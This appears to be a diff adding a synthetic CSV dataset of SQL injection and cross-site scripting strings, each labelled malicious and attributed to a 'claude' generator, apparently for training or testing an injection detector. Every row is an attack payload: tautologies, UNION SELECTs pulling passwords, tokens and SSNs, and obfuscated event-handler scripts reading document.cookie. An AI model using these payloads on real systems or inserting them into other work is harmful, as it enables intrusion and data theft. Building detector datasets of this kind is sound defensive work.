@@ -1,0 +1,2002 @@
+text,label,attack_type,category,generator
+4 AnD (select count(*) from auth)>0%00,1,sqli,nl_framed,claude
+can you show the field <details onbeforetoggle=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
+"""><svg onpageshow=alert(document.cookie)>",1,xss,xss_obf,claude
+0 Or 2=8/**/,1,sqli,bare_logic,claude
+1 oR exists(select balance from tokens)-- ,1,sqli,nl_framed,claude
+"<img%09src=x
+onerror=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+7 OR email LiKE '%'%00,1,sqli,quote_breakout,claude
+<svg/onstart=alert(document.domain)>,1,xss,xss_obf,claude
+<SvG oNERrOR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+can you show the field <input oncontentvisibilityautostatechange=print()> when it errors,1,xss,xss_obf,claude
+give profiles where pwd is anything or condition always holds,1,sqli,nl_framed,claude
+1 AnD (select count(*) from accounts)>1/*c*/,1,sqli,nl_framed,claude
+1 oR exists(select dob from orders)-- -,1,sqli,nl_framed,claude
+7 aND (select count(*) from clients)>0,1,sqli,nl_framed,claude
+<style%09onload=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+0x93 OR 0x28=0x71,1,sqli,encoding,claude
+<table oncontentvisibilityautostatechange=alert(document.cookie)>,1,xss,xss_obf,claude
+list the dob of all profiles regardless of id,1,sqli,nl_framed,claude
+char(52) oR char(57)=char(51),1,sqli,encoding,claude
+can you show the field <embed onanimationstart=alert(document.domain)> when it errors,1,xss,xss_obf,claude
+<svg/onpointerrawupdate=alert(document.domain)>,1,xss,xss_obf,claude
+1' or 'x'='x-- -,1,sqli,quote_breakout,claude
+get accounts where ssn is anything or condition always holds,1,sqli,nl_framed,claude
+please render <keygen onstart=alert(1)> here for the user,1,xss,xss_obf,claude
+<svg/onpointerrawupdate=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+7 UNiOn seLECT uid From people;,1,sqli,nl_framed,claude
+<svg/onload=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+"2	UnIoN/**/selEcT token,apikey,balance FROm cards/*c*/",1,sqli,nl_framed,claude
+pull every members where 2 = 2 or true,1,sqli,nl_framed,claude
+or exists(select email from auth);,1,sqli,nl_framed,claude
+get users where uid is anything or condition always holds,1,sqli,nl_framed,claude
+oR exists(select role from orders)%00,1,sqli,nl_framed,claude
+"6 UNION SeLEct pwd,secret frOm orders%00",1,sqli,nl_framed,claude
+});alert`1`;//,1,xss,xss_obf,claude
+'-alert(document.cookie)-',1,xss,xss_obf,claude
+<a href=&#106;avascript:print()>x</a>,1,xss,xss_obf,claude
+0x48 OR 0x51=0x82,1,sqli,encoding,claude
+give the secret of all clients regardless of id,1,sqli,nl_framed,claude
+1 Or ssn lIKE '%'-- -,1,sqli,quote_breakout,claude
+please render <svg ontoggle=confirm(1)> here for the user,1,xss,xss_obf,claude
+char(52) OR char(52)=char(57),1,sqli,encoding,claude
+char(50) Or char(51)=char(51),1,sqli,encoding,claude
+admin' Or 'y'='a-- x,1,sqli,quote_breakout,claude
+4 Or 1=1-- ,1,sqli,bare_logic,claude
+"""><keygen onstart=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+0x18 OR 0x96=0x38,1,sqli,encoding,claude
+9 or 6=1-- x,1,sqli,bare_logic,claude
+char(54) OR char(51)=char(48),1,sqli,encoding,claude
+can you show the field <table onstart=alert(1)> when it errors,1,xss,xss_obf,claude
+admin' oR 'x'='x-- x,1,sqli,quote_breakout,claude
+fetch each sessions where 3 is 9 or true,1,sqli,nl_framed,claude
+please render <marquee onload=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
+give clients where ssn is anything or condition always holds,1,sqli,nl_framed,claude
+please render <math onpointerrawupdate=alert(document.domain)> here for the user,1,xss,xss_obf,claude
+6 anD (select count(*) from orders)>2,1,sqli,nl_framed,claude
+please render <video onpointerrawupdate=print()> here for the user,1,xss,xss_obf,claude
+select any staff where 9 equals 4 or true,1,sqli,nl_framed,claude
+"<img
+src=x%09onerror=confirm(1)>",1,xss,xss_obf,claude
+<svg/onanimationstart=print()>,1,xss,xss_obf,claude
+<svg/onpointerrawupdate=alert(1)>,1,xss,xss_obf,claude
+"<textarea
+onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+or exists(select ssn from sessions)%00,1,sqli,nl_framed,claude
+8 AND (select count(*) from clients)>0-- ,1,sqli,nl_framed,claude
+char(55) or char(48)=char(54),1,sqli,encoding,claude
+please render <audio ontoggle=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+can you show the field <math onafterscriptexecute=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
+0x65 Or 0x93=0x48,1,sqli,encoding,claude
+3 anD (select count(*) from tokens)>3-- x,1,sqli,nl_framed,claude
+0x50 OR 0x58=0x45,1,sqli,encoding,claude
+4 OR tRue,1,sqli,bare_logic,claude
+<select onstart=globalThis['al'+'ert']`1`>,1,xss,nl_framed,claude
+1 oR exists(select secret from orders)%00,1,sqli,nl_framed,claude
+<img%20src=x%09onerror=alert(1)>,1,xss,xss_obf,claude
+<select onscrollend=top['al'+'ert']`1`>,1,xss,nl_framed,claude
+char(57) Or char(52)=char(50),1,sqli,encoding,claude
+<object onbeforetoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+1' OR 'b'='z-- x,1,sqli,quote_breakout,claude
+0x59 or 0x40=0x48,1,sqli,encoding,claude
+pull the apikey of any logs regardless of id,1,sqli,nl_framed,claude
+<img src=x%20onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+dump any people where 2 is 3 or true,1,sqli,nl_framed,claude
+please render <iframe onload=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+please render <style onstart=confirm(1)> here for the user,1,xss,xss_obf,claude
+<math onpageshow=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+return every users where 4 is 7 or true,1,sqli,nl_framed,claude
+7 or password LikE '%'/**/,1,sqli,quote_breakout,claude
+"""><details onanimationstart=confirm(1)>",1,xss,xss_obf,claude
+<img%20src=x%09onerror=alert(document.domain)>,1,xss,xss_obf,claude
+8 or TRUE,1,sqli,bare_logic,claude
+2 Or 3=6#,1,sqli,bare_logic,claude
+please render <table onfocus=eval(atob('YWxlcnQoMSk'))> here for the user,1,xss,xss_obf,claude
+1 OR exists(select pwd from logs)/**/,1,sqli,nl_framed,claude
+dump accounts where apikey is anything or condition always holds,1,sqli,nl_framed,claude
+can you show the field <keygen onerror=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
+<input onstart=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+give each orders where 5 equals 6 or true,1,sqli,nl_framed,claude
+4 oR TrUe,1,sqli,bare_logic,claude
+<style onbeforetoggle=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+return all cards where 2 is 3 or true,1,sqli,nl_framed,claude
+'-print()-',1,xss,xss_obf,claude
+6 OR truE,1,sqli,bare_logic,claude
+<video%09onscrollend=alert(document.cookie)>,1,xss,xss_obf,claude
+<keygen onscrollend=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+2 ANd (select count(*) from users)>1-- ,1,sqli,nl_framed,claude
+<imgsrc=xonerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+2 oR 6=4%00,1,sqli,bare_logic,claude
+please render <frameset ontoggle=alert(1)> here for the user,1,xss,xss_obf,claude
+"<table
+oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+can you show the field <svg oncontentvisibilityautostatechange=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
+1 or tRUE,1,sqli,bare_logic,claude
+char(55) oR char(54)=char(52),1,sqli,encoding,claude
+0x31 OR 0x84=0x66,1,sqli,encoding,claude
+<details%09onfocus=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+fetch sessions where ssn is anything or condition always holds,1,sqli,nl_framed,claude
+admin'	oR '1'='1,1,sqli,quote_breakout,claude
+8/**/UNION seleCt role FROm members;,1,sqli,nl_framed,claude
+char(54) OR char(50)=char(48),1,sqli,encoding,claude
+char(57) Or char(52)=char(53),1,sqli,encoding,claude
+<isindex	onpointerrawupdate=print()>,1,xss,xss_obf,claude
+"""><xss onanimationstart=confirm(1)>",1,xss,xss_obf,claude
+select every sessions where 8 is 9 or true,1,sqli,nl_framed,claude
+<svg/onerror=alert`1`>,1,xss,xss_obf,claude
+"2	union Select apikey,pwd frOm members",1,sqli,nl_framed,claude
+<img src=x	onerror=alert`1`>,1,xss,xss_obf,claude
+0x25 or 0x59=0x85,1,sqli,encoding,claude
+admin'	Or '1'='1,1,sqli,quote_breakout,claude
+"9 union%20sELECt hash,secret froM members-- x",1,sqli,nl_framed,claude
+select logs where secret is anything or condition always holds,1,sqli,nl_framed,claude
+select each cards where 2 is 8 or true,1,sqli,nl_framed,claude
+1 OR exists(select ssn from cards)/**/,1,sqli,nl_framed,claude
+select tokens where password is anything or condition always holds,1,sqli,nl_framed,claude
+<framesetonanimationstart=alert(1)>,1,xss,xss_obf,claude
+4%20uNIOn%20selECt secret from auth%00,1,sqli,nl_framed,claude
+select cards where pwd is anything or condition always holds,1,sqli,nl_framed,claude
+1' Or 'z'='y-- -,1,sqli,quote_breakout,claude
+can you show the field <style onanimationstart=alert(document.domain)> when it errors,1,xss,xss_obf,claude
+char(49) OR char(51)=char(48),1,sqli,encoding,claude
+<svg/onscrollend=alert(1)>,1,xss,xss_obf,claude
+1' or 'x'='a,1,sqli,quote_breakout,claude
+please render <embed onpageshow=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+can you show the field <details oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))> when it errors,1,xss,xss_obf,claude
+"""><math onstart=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+char(56) OR char(49)=char(48),1,sqli,encoding,claude
+0x27 or 0x55=0x27,1,sqli,encoding,claude
+x' Or 'z'='z%00,1,sqli,quote_breakout,claude
+6 oR True,1,sqli,bare_logic,claude
+can you show the field <style onbeforetoggle=alert(document.domain)> when it errors,1,xss,xss_obf,claude
+6	UNION/**/sElECt balance FROM tokens#,1,sqli,nl_framed,claude
+<svg/onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+0x84 oR 0x39=0x38,1,sqli,encoding,claude
+oR exists(select apikey from users)#,1,sqli,nl_framed,claude
+1 And (select count(*) from members)>1;,1,sqli,nl_framed,claude
+admin' or 'z'='y,1,sqli,quote_breakout,claude
+"""><iframe onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+8 aND (select count(*) from sessions)>1-- ,1,sqli,nl_framed,claude
+<video ontoggle=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+});alert(document.domain);//,1,xss,xss_obf,claude
+<svg/oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+admin' OR 'a'='y-- x,1,sqli,quote_breakout,claude
+please render <embed onfocus=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
+0x84 oR 0x60=0x18,1,sqli,encoding,claude
+char(54) or char(56)=char(56),1,sqli,encoding,claude
+Or exists(select uid from tokens),1,sqli,nl_framed,claude
+<svg/onbeforetoggle=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+1 OR exists(select password from auth)#,1,sqli,nl_framed,claude
+"5	UnION/**/selEct hash,pwd frOm auth-- -",1,sqli,nl_framed,claude
+"8%20unIoN%20SELeCT password,secret froM members/*c*/",1,sqli,nl_framed,claude
+get the password of every profiles regardless of id,1,sqli,nl_framed,claude
+8 ANd (select count(*) from clients)>3/**/,1,sqli,nl_framed,claude
+4 and (select count(*) from admins)>3#,1,sqli,nl_framed,claude
+8 OR TRUe,1,sqli,bare_logic,claude
+char(57) Or char(51)=char(54),1,sqli,encoding,claude
+pull orders where password is anything or condition always holds,1,sqli,nl_framed,claude
+<input onscrollend=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+<iFrAmE ONERror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+please render <details oncontentvisibilityautostatechange=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+0 OR 3=2,1,sqli,bare_logic,claude
+<img%09src=x/onerror=alert`1`>,1,xss,xss_obf,claude
+"<img
+src=x%20onerror=alert(document.domain)>",1,xss,xss_obf,claude
+admin'OR '1'='1,1,sqli,quote_breakout,claude
+1/**/unioN%20sEleCT secret from clients-- ,1,sqli,nl_framed,claude
+1' OR 'z'='x#,1,sqli,quote_breakout,claude
+dump each members where 3 equals 2 or true,1,sqli,nl_framed,claude
+dump admins where uid is anything or condition always holds,1,sqli,nl_framed,claude
+1' OR 'a'='y%00,1,sqli,quote_breakout,claude
+6 OR 1=5-- ,1,sqli,bare_logic,claude
+"<video
+onload=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+3 or TRUe,1,sqli,bare_logic,claude
+char(52) or char(54)=char(56),1,sqli,encoding,claude
+"""><select onscrollend=confirm(1)>",1,xss,nl_framed,claude
+"8/**/unIon SeLEct balance,apikey FRoM people/**/",1,sqli,nl_framed,claude
+show me all users where 2 equals 9 or true,1,sqli,nl_framed,claude
+show me staff where token is anything or condition always holds,1,sqli,nl_framed,claude
+<math	onafterscriptexecute=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+1 oR exists(select password from admins);,1,sqli,nl_framed,claude
+root' or 'x'='x/*c*/,1,sqli,quote_breakout,claude
+<img%09src=x	onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+<img/src=x/onerror=alert(document.domain)>,1,xss,xss_obf,claude
+<form onbeforetoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+admin' oR '1'='1,1,sqli,quote_breakout,claude
+9%20uNiOn%20seleCT dob froM auth/*c*/,1,sqli,nl_framed,claude
+"<imgsrc=x
+onerror=confirm(1)>",1,xss,xss_obf,claude
+list auth where password is anything or condition always holds,1,sqli,nl_framed,claude
+6 oR 5=6%00,1,sqli,bare_logic,claude
+root' OR 'b'='a/*c*/,1,sqli,quote_breakout,claude
+can you show the field <audio onpageshow=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
+give all people where 1 equals 4 or true,1,sqli,nl_framed,claude
+0x82 Or 0x34=0x68,1,sqli,encoding,claude
+<iFrAmE onErRoR=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+admin' OR '1'='1,1,sqli,quote_breakout,claude
+show me every tokens where 7 equals 7 or true,1,sqli,nl_framed,claude
+admin' oR 'z'='y/*c*/,1,sqli,quote_breakout,claude
+<SvG oNeRROR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+x' or 'x'='z%00,1,sqli,quote_breakout,claude
+"""><input onscrollend=alert(1)>",1,xss,xss_obf,claude
+});print();//,1,xss,xss_obf,claude
+<SvG OnError=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+<a href=&#106;avascript:window['ale'+'rt']`1`>x</a>,1,xss,xss_obf,claude
+0x30 Or 0x25=0x18,1,sqli,encoding,claude
+retrieve the pwd of each orders regardless of id,1,sqli,nl_framed,claude
+7 or 5=8-- ,1,sqli,bare_logic,claude
+1' oR 'b'='y#,1,sqli,quote_breakout,claude
+char(52) OR char(51)=char(49),1,sqli,encoding,claude
+2 oR trUe,1,sqli,bare_logic,claude
+9 Or tRUE,1,sqli,bare_logic,claude
+2 oR true,1,sqli,bare_logic,claude
+<svg/onerror=alert(document.cookie)>,1,xss,xss_obf,claude
+retrieve the balance of every auth regardless of id,1,sqli,nl_framed,claude
+1 or exists(select pwd from staff)-- -,1,sqli,nl_framed,claude
+7%20UnIon SeLeCt balance fROM accounts#,1,sqli,nl_framed,claude
+can you show the field <isindex onbeforetoggle=confirm(1)> when it errors,1,xss,xss_obf,claude
+<embed onfocus=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+3 aNd (select count(*) from logs)>0;,1,sqli,nl_framed,claude
+<object onload=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+7 Or 8=4-- -,1,sqli,bare_logic,claude
+8 OR pwd lIKe '%'%00,1,sqli,quote_breakout,claude
+<img/src=x/onerror=alert`1`>,1,xss,xss_obf,claude
+char(52) Or char(49)=char(50),1,sqli,encoding,claude
+0x54 OR 0x88=0x30,1,sqli,encoding,claude
+Or exists(select apikey from admins)-- x,1,sqli,nl_framed,claude
+can you show the field <keygen onload=alert(1)> when it errors,1,xss,xss_obf,claude
+9 AnD (select count(*) from cards)>3/**/,1,sqli,nl_framed,claude
+<svg onscrollend=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+char(49) Or char(49)=char(53),1,sqli,encoding,claude
+<img%20src=xonerror=confirm(1)>,1,xss,xss_obf,claude
+7 OR role Like '%';,1,sqli,quote_breakout,claude
+<iframe onscrollend=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+5 oR 5=2/*c*/,1,sqli,bare_logic,claude
+"""><object oncontentvisibilityautostatechange=alert(document.domain)>",1,xss,xss_obf,claude
+0x90 OR 0x51=0x84,1,sqli,encoding,claude
+<svg/onbeforetoggle=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+"""><audio oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+char(56) oR char(54)=char(52),1,sqli,encoding,claude
+1' OR 'a'='b-- x,1,sqli,quote_breakout,claude
+"""><object onstart=confirm(1)>",1,xss,xss_obf,claude
+8	unION SElEcT uid FRom logs;,1,sqli,nl_framed,claude
+<embed onafterscriptexecute=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+5 aND (select count(*) from auth)>0-- ,1,sqli,nl_framed,claude
+please render <xss onpageshow=print()> here for the user,1,xss,xss_obf,claude
+Or exists(select password from profiles)%00,1,sqli,nl_framed,claude
+"8	UNIoN/**/SeLECT hash,balance froM members-- x",1,sqli,nl_framed,claude
+<svg/onpointerrawupdate=confirm(1)>,1,xss,xss_obf,claude
+get the hash of any auth regardless of id,1,sqli,nl_framed,claude
+show me each profiles where 2 = 2 or true,1,sqli,nl_framed,claude
+0x26 or 0x64=0x79,1,sqli,encoding,claude
+retrieve the password of every logs regardless of id,1,sqli,nl_framed,claude
+can you show the field <audio ontoggle=alert(1)> when it errors,1,xss,xss_obf,claude
+9 AnD (select count(*) from logs)>0-- -,1,sqli,nl_framed,claude
+admin' Or 'b'='z#,1,sqli,quote_breakout,claude
+<xss onbeforetoggle=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+return accounts where token is anything or condition always holds,1,sqli,nl_framed,claude
+"""><marquee onafterscriptexecute=confirm(1)>",1,xss,xss_obf,claude
+give members where ssn is anything or condition always holds,1,sqli,nl_framed,claude
+"<audio
+onbeforetoggle=alert(document.cookie)>",1,xss,xss_obf,claude
+<marquee onload=alert`1`>,1,xss,xss_obf,claude
+6 or hash LiKe '%'/*c*/,1,sqli,quote_breakout,claude
+0x75 oR 0x97=0x44,1,sqli,encoding,claude
+"2/**/UNIoN Select token,secret fRoM orders-- x",1,sqli,nl_framed,claude
+'-eval(atob('YWxlcnQoMSk'))-',1,xss,xss_obf,claude
+<object onfocus=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+<isindex onfocus=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+<details onanimationstart=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+5 Or True,1,sqli,bare_logic,claude
+<img	src=x%20onerror=alert`1`>,1,xss,xss_obf,claude
+or exists(select role from staff)/**/,1,sqli,nl_framed,claude
+<audio onerror=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+<iFrAmE onERrOR=alert`1`>,1,xss,xss_obf,claude
+"""><form onstart=confirm(1)>",1,xss,xss_obf,claude
+<imgsrc=x/onerror=alert(document.cookie)>,1,xss,xss_obf,claude
+"8%20UNiON/**/SEleCt pwd,dob FroM admins;",1,sqli,nl_framed,claude
+get auth where apikey is anything or condition always holds,1,sqli,nl_framed,claude
+list any orders where 2 is 2 or true,1,sqli,nl_framed,claude
+7 oR tRue,1,sqli,bare_logic,claude
+9 oR TrUE,1,sqli,bare_logic,claude
+give orders where dob is anything or condition always holds,1,sqli,nl_framed,claude
+OR exists(select uid from auth)-- x,1,sqli,nl_framed,claude
+oR exists(select uid from staff)/**/,1,sqli,nl_framed,claude
+pull the token of any staff regardless of id,1,sqli,nl_framed,claude
+7 oR tRuE,1,sqli,bare_logic,claude
+"<img
+src=x
+onerror=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+<IMG OnERRor=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+return the ssn of each tokens regardless of id,1,sqli,nl_framed,claude
+"<img
+src=x	onerror=alert(document.cookie)>",1,xss,xss_obf,claude
+9 OR pwd lIKe '%'-- x,1,sqli,quote_breakout,claude
+please render <iframe onanimationstart=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
+"9%20UNioN%20seleCT hash,dob frOm tokens/**/",1,sqli,nl_framed,claude
+can you show the field <details onpointerrawupdate=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
+char(55) OR char(56)=char(51),1,sqli,encoding,claude
+can you show the field <body onscrollend=alert(document.domain)> when it errors,1,xss,xss_obf,claude
+<iFrAmE ONerrOr=confirm(1)>,1,xss,xss_obf,claude
+"""><svg onload=alert(document.domain)>",1,xss,xss_obf,claude
+"""><keygen onpointerrawupdate=confirm(1)>",1,xss,xss_obf,claude
+2 Or TrUe,1,sqli,bare_logic,claude
+dump logs where balance is anything or condition always holds,1,sqli,nl_framed,claude
+"""><style onstart=alert`1`>",1,xss,xss_obf,claude
+6 Or 2=8%00,1,sqli,bare_logic,claude
+show me any accounts where 9 is 6 or true,1,sqli,nl_framed,claude
+Or exists(select hash from members)#,1,sqli,nl_framed,claude
+1 ANd (select count(*) from users)>0%00,1,sqli,nl_framed,claude
+char(51) Or char(50)=char(53),1,sqli,encoding,claude
+<img/src=xonerror=alert`1`>,1,xss,xss_obf,claude
+char(53) OR char(55)=char(49),1,sqli,encoding,claude
+8%20unIon%20selECt balance fROm members-- ,1,sqli,nl_framed,claude
+<frameset onbeforetoggle=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+<body onpointerrawupdate=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+char(55) or char(52)=char(50),1,sqli,encoding,claude
+list all users where 1 equals 5 or true,1,sqli,nl_framed,claude
+4 Or email LIke '%'-- ,1,sqli,quote_breakout,claude
+"<body
+onfocus=alert(1)>",1,xss,xss_obf,claude
+0x19 or 0x58=0x36,1,sqli,encoding,claude
+"<img
+src=x	onerror=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+<img%20src=x onerror=alert(document.domain)>,1,xss,xss_obf,claude
+5 Or uid LiKe '%'/**/,1,sqli,quote_breakout,claude
+can you show the field <frameset ontoggle=alert(1)> when it errors,1,xss,xss_obf,claude
+can you show the field <isindex ontoggle=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
+1' or 'z'='z/*c*/,1,sqli,quote_breakout,claude
+<IMG OnerrOR=confirm(1)>,1,xss,xss_obf,claude
+<iFrAmE oNErROR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+char(57) or char(51)=char(56),1,sqli,encoding,claude
+select orders where hash is anything or condition always holds,1,sqli,nl_framed,claude
+give every logs where 3 = 4 or true,1,sqli,nl_framed,claude
+1 Or role LIkE '%'/*c*/,1,sqli,quote_breakout,claude
+8 oR trUe,1,sqli,bare_logic,claude
+char(49) OR char(52)=char(51),1,sqli,encoding,claude
+<marquee oncontentvisibilityautostatechange=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+show me the token of all cards regardless of id,1,sqli,nl_framed,claude
+"7/**/uniON sEleCt hash,password FrOM members-- ",1,sqli,nl_framed,claude
+<video onafterscriptexecute=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+root' or 'a'='b-- -,1,sqli,quote_breakout,claude
+"""><input onfocus=alert(document.domain)>",1,xss,xss_obf,claude
+return clients where token is anything or condition always holds,1,sqli,nl_framed,claude
+<svg/onfocus=alert(document.cookie)>,1,xss,xss_obf,claude
+0x33 or 0x18=0x75,1,sqli,encoding,claude
+0x81 Or 0x68=0x87,1,sqli,encoding,claude
+fetch the token of each sessions regardless of id,1,sqli,nl_framed,claude
+"<img src=x
+onerror=alert(document.cookie)>",1,xss,xss_obf,claude
+list every cards where 8 is 5 or true,1,sqli,nl_framed,claude
+<iframe	onpointerrawupdate=confirm(1)>,1,xss,xss_obf,claude
+0x40 or 0x39=0x29,1,sqli,encoding,claude
+show me the balance of all logs regardless of id,1,sqli,nl_framed,claude
+1' oR 'x'='x-- x,1,sqli,quote_breakout,claude
+Or exists(select pwd from staff)/*c*/,1,sqli,nl_framed,claude
+0x69 OR 0x70=0x98,1,sqli,encoding,claude
+<bodyonbeforetoggle=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+"""><marquee onafterscriptexecute=alert(1)>",1,xss,xss_obf,claude
+<embedoncontentvisibilityautostatechange=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+<svg/onanimationstart=alert(document.cookie)>,1,xss,xss_obf,claude
+4%20UnIon%20sElECt hash from auth-- ,1,sqli,nl_framed,claude
+8%20UniON%20SeLeCt token FroM admins;,1,sqli,nl_framed,claude
+4 or token LikE '%'%00,1,sqli,quote_breakout,claude
+can you show the field <details onscrollend=top['al'+'ert'](1)> when it errors,1,xss,xss_obf,claude
+<img src=x%09onerror=alert(document.domain)>,1,xss,xss_obf,claude
+3 oR TRUE,1,sqli,bare_logic,claude
+8 or tRUe,1,sqli,bare_logic,claude
+"""><svg onstart=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+<imgsrc=x%20onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+admin' or 'a'='y/*c*/,1,sqli,quote_breakout,claude
+char(54) or char(53)=char(51),1,sqli,encoding,claude
+9 oR 3=5-- ,1,sqli,bare_logic,claude
+4 Or hash like '%'-- -,1,sqli,quote_breakout,claude
+2 OR dob lIke '%'-- ,1,sqli,quote_breakout,claude
+can you show the field <object oncontentvisibilityautostatechange=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
+7 anD (select count(*) from clients)>2,1,sqli,nl_framed,claude
+0x50 or 0x21=0x17,1,sqli,encoding,claude
+admin'oR '1'='1,1,sqli,quote_breakout,claude
+<math%20onafterscriptexecute=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+<svg/onstart=alert(1)>,1,xss,xss_obf,claude
+"1 UNiON sELeCT email,pwd fROM clients%00",1,sqli,nl_framed,claude
+});confirm(1);//,1,xss,xss_obf,claude
+5 Or password LIKE '%'/**/,1,sqli,quote_breakout,claude
+"""><style onfocus=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+5 oR TruE,1,sqli,bare_logic,claude
+root' or 'a'='z/**/,1,sqli,quote_breakout,claude
+<table onload=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+"<img
+src=x
+onerror=alert`1`>",1,xss,xss_obf,claude
+'-top['al'+'ert'](1)-',1,xss,xss_obf,claude
+<IMG OnERRoR=alert`1`>,1,xss,xss_obf,claude
+<img%20src=x%09onerror=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+4 or 2=5/*c*/,1,sqli,bare_logic,claude
+4 Or secret LikE '%'-- -,1,sqli,quote_breakout,claude
+<img src=xonerror=confirm(1)>,1,xss,xss_obf,claude
+select tokens where token is anything or condition always holds,1,sqli,nl_framed,claude
+char(50) OR char(55)=char(52),1,sqli,encoding,claude
+can you show the field <style onafterscriptexecute=confirm(1)> when it errors,1,xss,xss_obf,claude
+0x32 OR 0x18=0x80,1,sqli,encoding,claude
+get each orders where 3 is 9 or true,1,sqli,nl_framed,claude
+please render <body onanimationstart=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+5 And (select count(*) from people)>3/*c*/,1,sqli,nl_framed,claude
+<BoDy onERRoR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+return the email of any accounts regardless of id,1,sqli,nl_framed,claude
+please render <object onstart=confirm(1)> here for the user,1,xss,xss_obf,claude
+0x68 OR 0x47=0x92,1,sqli,encoding,claude
+<svg/onafterscriptexecute=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+get the dob of all tokens regardless of id,1,sqli,nl_framed,claude
+2 oR 8=5,1,sqli,bare_logic,claude
+5 or 4=2#,1,sqli,bare_logic,claude
+2 OR token liKE '%',1,sqli,quote_breakout,claude
+list logs where pwd is anything or condition always holds,1,sqli,nl_framed,claude
+x' Or 'a'='x;,1,sqli,quote_breakout,claude
+"""><object onbeforetoggle=alert(document.cookie)>",1,xss,xss_obf,claude
+give cards where hash is anything or condition always holds,1,sqli,nl_framed,claude
+5 And (select count(*) from members)>0#,1,sqli,nl_framed,claude
+fetch any staff where 8 equals 5 or true,1,sqli,nl_framed,claude
+Or exists(select password from logs)/*c*/,1,sqli,nl_framed,claude
+"<img
+src=x/onerror=print()>",1,xss,xss_obf,claude
+<details onstart=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+"""><audio onfocus=alert`1`>",1,xss,xss_obf,claude
+please render <xss onload=alert(1)> here for the user,1,xss,xss_obf,claude
+1 or 7=8;,1,sqli,bare_logic,claude
+<input onpointerrawupdate=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+9 Or 3=3,1,sqli,bare_logic,claude
+<SvG onErrOR=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+char(57) oR char(56)=char(49),1,sqli,encoding,claude
+<SvG onERrOr=alert(1)>,1,xss,xss_obf,claude
